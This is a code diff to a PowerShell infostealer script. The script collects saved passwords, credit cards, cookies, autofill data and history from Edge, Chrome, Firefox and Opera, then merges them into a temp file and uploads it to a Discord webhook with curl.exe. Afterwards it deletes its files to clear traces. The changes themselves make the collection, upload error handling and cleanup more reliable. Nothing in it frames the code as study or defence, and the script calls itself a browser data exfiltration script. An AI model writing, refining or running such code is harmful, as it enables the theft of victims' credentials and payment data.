@@ -99,7 +99,10 @@ if ([string]::IsNullOrEmpty($dc)) {
 }
 
 # Collect browser data in parallel
-$outputFile = "$env:TMP\BrowserData.txt"
+$outputDir = "$env:TMP\BrowserData"
+if (-not (Test-Path $outputDir)) {
+    New-Item -ItemType Directory -Path $outputDir | Out-Null
+}
 try {
     $browsers = @("edge", "chrome", "firefox", "opera")
     $dataTypes = @("passwords", "creditcards", "cookies", "autofill", "history")
@@ -107,6 +110,7 @@ try {
     $jobs = @()
     foreach ($browser in $browsers) {
         foreach ($dataType in $dataTypes) {
+            $outputFile = "$outputDir\${browser}_${dataType}.txt"
             $jobs += Start-Job -ScriptBlock {
                 param ($browser, $dataType, $outputFile)
                 $data = Get-BrowserData -Browser $browser -DataType $dataType
@@ -123,6 +127,12 @@ try {
     Write-Error "Failed to collect browser data: $_"
 }
 
+# Combine all output files into one
+$outputFile = "$env:TMP\BrowserData.txt"
+Get-ChildItem -Path $outputDir -Filter *.txt | ForEach-Object {
+    Get-Content $_.FullName | Add-Content -Path $outputFile
+}
+
 # Ensure output file is not empty
 if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
     Write-Error "No data collected. Exiting."
@@ -133,14 +143,18 @@ if (-not (Test-Path $outputFile) -or (Get-Item $outputFile).Length -eq 0) {
 try {
     $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
     Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
-    curl.exe -F "file1=@$outputFile" $dc
+    $response = curl.exe -F "file1=@$outputFile" $dc
+    if ($LASTEXITCODE -ne 0) {
+        Write-Error "Failed to upload file to Discord webhook. Response: $response"
+    }
 } catch {
     Write-Error "Failed to send notification to Discord webhook: $_"
 }
 
 # Clean up
 try {
+    Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
 } catch {
-    Write-Warning "Failed to clean up the output file: $_"
+    Write-Warning "Failed to clean up the output files: $_"
 }
